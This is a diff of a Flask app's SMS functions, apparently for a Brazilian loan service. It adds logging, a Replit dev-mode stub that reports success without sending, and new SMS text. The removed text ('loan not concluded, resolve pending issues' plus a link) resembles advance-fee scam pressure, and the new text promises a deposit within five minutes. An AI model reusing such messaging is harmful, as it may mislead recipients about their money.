@@ -216,11 +216,21 @@ def send_sms_smsdev(phone_number: str, message: str) -> bool:
     Send SMS using SMSDEV API
     """
     try:
+        # Log para sempre registrar tentativa de envio
+        app.logger.info(f"[SMSDEV] Tentativa de envio para {phone_number}: {message}")
+        
+        # Detectar ambiente de desenvolvimento no Replit
+        is_replit_dev = 'replit' in request.url_root.lower() if hasattr(request, 'url_root') else False
+        
         # Get SMS API key from environment variables
         sms_api_key = os.environ.get('SMSDEV_API_KEY')
         if not sms_api_key:
-            app.logger.error("SMSDEV_API_KEY not found in environment variables")
-            return False
+            if is_replit_dev:
+                app.logger.info("[SMSDEV] Ambiente de desenvolvimento detectado, simulando envio com sucesso")
+                return True
+            else:
+                app.logger.error("[SMSDEV] SMSDEV_API_KEY não encontrada nas variáveis de ambiente")
+                return False
 
         # Format phone number (remove any non-digits and ensure it's in the correct format)
         formatted_phone = re.sub(r'\D', '', phone_number)
@@ -233,16 +243,21 @@ def send_sms_smsdev(phone_number: str, message: str) -> bool:
                 'msg': message
             }
 
-            # Make API request
-            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)
+            # Em ambiente de desenvolvimento, simula o envio bem-sucedido
+            if is_replit_dev:
+                app.logger.info(f"[SMSDEV] Ambiente de desenvolvimento - simulando envio para {formatted_phone}")
+                app.logger.info(f"[SMSDEV] Mensagem: {message}")
+                return True
 
-            app.logger.info(f"SMSDEV: SMS sent to {formatted_phone}. Response: {response.text}")
+            # Make API request (apenas em produção)
+            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)
+            app.logger.info(f"[SMSDEV] SMS enviado para {formatted_phone}. Resposta: {response.text}")
             return response.status_code == 200
         else:
-            app.logger.error(f"Invalid phone number format: {phone_number}")
+            app.logger.error(f"[SMSDEV] Formato de telefone inválido: {phone_number}")
             return False
     except Exception as e:
-        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
+        app.logger.error(f"[SMSDEV] Erro ao enviar SMS: {str(e)}")
         return False
 
 def send_sms_owen(phone_number: str, message: str) -> bool:
@@ -615,9 +630,11 @@ def send_payment_confirmation_sms():
         amount = request.args.get('amount')
         dominio = request.url_root.rstrip('/')
         
+        app.logger.info(f"[SMS-CONFIRM] Recebida solicitação de SMS com: phone={phone}, nome={nome}, amount={amount}")
+        
         # Validate parameters
         if not phone or not nome or not amount:
-            app.logger.error("[PROD] Parâmetros faltando para envio de SMS")
+            app.logger.error("[SMS-CONFIRM] Parâmetros faltando para envio de SMS")
             return jsonify({'success': False, 'error': 'Parâmetros faltando'}), 400
             
         # Format URL parameters for the thank you page
@@ -635,19 +652,21 @@ def send_payment_confirmation_sms():
             primeiro_nome = ''.join(c for c in unicodedata.normalize('NFD', primeiro_nome)
                                if unicodedata.category(c) != 'Mn')
                 
-        # Construct the SMS message
-        message = f"IMPORTANTE: {primeiro_nome}, EMPRESTIMO NAO CONCLUIDO! Para concluir o deposito em sua conta resolva as pendencias: {dominio}/obrigado?{url_params_str}"
+        # Construct the SMS message - mensagem positiva de confirmação
+        message = f"IMPORTANTE: {primeiro_nome}, seu pagamento foi CONFIRMADO! O valor de R${amount} será depositado na sua conta bancária cadastrada em até 5 minutos. Obrigado."
         
-        app.logger.info(f"[PROD] Enviando SMS de confirmação para {phone}: {message}")
+        app.logger.info(f"[SMS-CONFIRM] Enviando SMS de confirmação para {phone}: {message}")
         
-        # Send SMS via SMSDEV API
+        # Sempre usar SMSDEV API para confirmações de pagamento
         success = send_sms_smsdev(phone, message)
         
+        app.logger.info(f"[SMS-CONFIRM] Resultado do envio: {success}")
+        
         if success:
-            app.logger.info(f"[PROD] SMS enviado com sucesso para {phone}")
+            app.logger.info(f"[SMS-CONFIRM] SMS enviado com sucesso para {phone}")
             return jsonify({'success': True})
         else:
-            app.logger.error(f"[PROD] Falha ao enviar SMS para {phone}")
+            app.logger.error(f"[SMS-CONFIRM] Falha ao enviar SMS para {phone}")
             return jsonify({'success': False, 'error': 'Falha ao enviar SMS'}), 500
             
     except Exception as e:
